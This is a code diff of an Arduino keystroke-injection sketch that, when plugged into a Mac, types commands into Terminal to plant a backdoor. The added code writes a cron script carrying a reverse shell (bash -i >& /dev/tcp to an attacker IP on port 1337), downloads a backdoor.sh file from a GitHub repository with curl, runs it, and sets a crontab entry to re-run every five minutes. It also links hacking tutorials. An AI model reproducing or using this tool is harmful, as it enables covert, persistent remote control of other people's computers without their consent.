@@ -3,7 +3,8 @@
 
 // Adapted for Spanish keyboard layout
 
-#define LED_PIN 13
+#define LED_PIN 13 // Built in circuit LED
+
 #define KEY_LEFT_CTRL     0x80
 #define KEY_LEFT_SHIFT    0x81
 #define KEY_LEFT_ALT      0x82
@@ -28,19 +29,18 @@ void setup()
 
   // now open Terminal and open new Terminal tab
   openapp("termi");
+  cmd(116); // cmd + t
   
   // Create a cron which opens a backdoor
 
   // typeln("rm /Library/Caches/cron.sh");
-  Keyboard.print("rm "); shift(55);
-  Keyboard.print("Library"); shift(55);
-  Keyboard.print("Caches"); shift(55);
+  Keyboard.print("rm "); 
+  typefolderroute();
   typeln("cron.sh");
 
   // typeln("vi /Library/Caches/cron.sh");
-  Keyboard.print("vi "); shift(55);
-  Keyboard.print("Library"); shift(55);
-  Keyboard.print("Caches"); shift(55);
+  Keyboard.print("vi "); 
+  typefolderroute();
   typeln("cron.sh");
   
   Keyboard.print("i");
@@ -49,17 +49,63 @@ void setup()
   alt(51); shift(49); shift(55);
   Keyboard.print("bin"); shift(55);
   typeln("bash");
-  
+
+  // Open a reverse Shell connection to your IP (listen with netcat)
   // typeln("bash -i >& /dev/tcp/XXX.XX.XX.XX/1337 0>&1");
   
-  // Write and save
-  Keyboard.press(KEY_ESC);
-  Keyboard.press(KEY_ESC);
+  // For further reading:
+  // https://null-byte.wonderhowto.com/how-to/create-backdoor-osx-0162551/
+  // https://scriptingosx.com/2017/07/ssh-tunnels/
+  // https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/
+
+  // Delete any existing backdoor.sh file
+  // typeln("rm /Library/Caches/backdoor.sh");
+  Keyboard.print("rm ");
+  typefolderroute();
+  typeln("backdoor.sh");
+  
+  // Sync the latest backdoor.sh file from our repo
+  // typeln("curl -O https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/backdoor.sh /Library/Caches/backdoor.sh");
+  Keyboard.print("curl "); Keyboard.write(47); Keyboard.print("O ");
+  Keyboard.print("https"); shift(46); shift(55); shift(55);
+  Keyboard.print("raw.githubusercontent.com"); shift(55);
+  Keyboard.print("angeldiazibarra"); shift(55);
+  Keyboard.print("osx"); Keyboard.write(47); Keyboard.print("usb"); Keyboard.write(47); Keyboard.print("hack"); Keyboard.write(47); Keyboard.print("arduino"); shift(55);
+  Keyboard.print("master"); shift(55);
+  Keyboard.print("backdoor.sh "); 
+  typefolderroute();
+  typeln("backdoor.sh");
+
+  // Execute backdoor.sh file
+  Keyboard.print("sh ");
+  typefolderroute();
+  typeln("backdoor.sh");
+
+  writeandsave();
+
+  // Create a cron task to execute cron.sh every 5 minutes
+  Keyboard.print("crontab "); Keyboard.write(47); typeln("e");
+
+  writeandsave();
+  
+  // Close terminal window
+  // cmd(113); // cmd + q
+}
+
+void writeandsave(){
+  // Write and save in vim
+  Keyboard.write(KEY_ESC);
+  Keyboard.write(KEY_ESC);
   shift(46); typeln("w"); // typeln(":w");
   shift(46); typeln("q"); // typeln(":q");
+}
 
-  // Close terminal window
-  cmd(113); // cmd + q
+void typefolderroute(){
+  shift(55);
+  Keyboard.print("Library");
+  shift(55);
+  Keyboard.print("Caches");
+  shift(55);
 }
 
 void shift(int key){
@@ -89,17 +135,16 @@ void openapp(String app){
     
   typeln(app);
   
-  delay(250);
+  delay(200);
 }
 
 
 // type a string (pressing enter at the end)
 // you can add extra delays so you can see what's happening
-// by uncommenting the delays
 void typeln(String chars)
 {
   Keyboard.print(chars);
-  delay(100);
+  // delay(50);
   Keyboard.write(176);
   delay(200);
 }
